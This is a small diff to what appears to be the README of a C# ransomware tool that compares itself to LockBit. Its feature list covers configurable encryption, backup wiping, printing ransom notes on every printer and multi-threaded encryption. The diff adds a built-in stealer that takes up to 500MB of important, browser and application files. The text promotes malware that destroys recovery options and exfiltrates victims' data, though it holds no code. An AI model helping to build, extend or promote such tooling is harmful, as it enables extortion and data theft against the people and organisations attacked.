@@ -12,6 +12,7 @@ Do **NOT** Expect this to be Fast as LockBit, Due to Limitations of .NET 4 (C#) 
 - **XChaCha/XSalsa with Configurable Rounds** (8/12/20)
 - **RSA with Configurable Bits** (1024/2048/3072/4096)
 - **Backup Wipe**
+- **Built In Stealer** (StealByt, Steals 500MB of Important files,Browser Files,Application File's, Harvest-Now-Decrypt-Later)
 - **Print Ransom Note on All Printers**
 - **Better Parallel Tuner**
 - **Multi Threaded Encryption**
